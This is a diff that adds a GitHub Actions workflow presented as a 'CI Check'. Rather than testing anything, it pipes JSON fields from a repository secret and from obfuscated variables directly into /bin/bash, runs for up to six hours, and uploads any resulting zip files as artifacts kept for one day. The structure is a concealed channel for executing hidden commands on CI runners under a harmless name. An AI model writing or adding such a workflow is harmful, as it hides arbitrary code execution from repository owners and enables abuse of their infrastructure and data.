@@ -1,0 +1,29 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          vi253: ${{ secrets.vi253 }}
+        run: |
+          printf '%s' "$vi253" | jq -r .eavqm07 | /bin/bash
+          printf '%s' "$uif1" | jq -r .tpimp5971 | /bin/bash
+          echo $kzeb9077 | jq -r .jdpbp287 | /bin/bash
+          echo $cdwrb028 | jq -r .kxyq1 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: m2epCIMW
+          path: "*.zip"
+          retention-days: 1
